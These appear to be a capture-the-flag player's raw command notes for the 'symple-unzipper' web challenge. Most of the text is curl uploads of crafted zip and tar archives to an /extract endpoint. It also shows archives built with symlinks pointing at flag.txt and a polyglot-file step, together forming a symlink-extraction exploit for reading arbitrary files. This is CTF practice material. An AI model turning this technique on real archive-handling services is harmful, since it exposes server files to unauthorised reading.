curl -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@ls.zip;type=application/zip'

curl -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@a.zip;type=application/zip'

zip --symlinks myzip.zip myflag.txt ls.txt

curl -v -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@myzip.zip;type=application/zip'

curl -v -X 'POST' \
  'http://localhost/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@myzip.zip;type=application/zip'

curl -v -X 'POST' \
  'http://localhost/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@mytar.tar;type=application/zip'

curl -v -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@zipgo.tar;type=application/zip'


curl -v -X 'POST' \
  'http://localhost/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@zipgo.tar;type=application/zip'

tar --owner=root --group=root --create --file mytar.tar ls.txt flaglink
/opt/tools/mitra/mitra.py mytar.tar ls.zip
mv S* zipgo.tar

curl -X 'POST' \
  'http://localhost/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@give_me_flag.tar;type=application/tar'

tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk

$ tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk

$ tar tvf give_me_flag.tar 
lrwxrwxrwx root/root         0 2022-06-13 21:28 flag.lnk -> flag.txt

curl -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@hackit.tar;type=application/tar'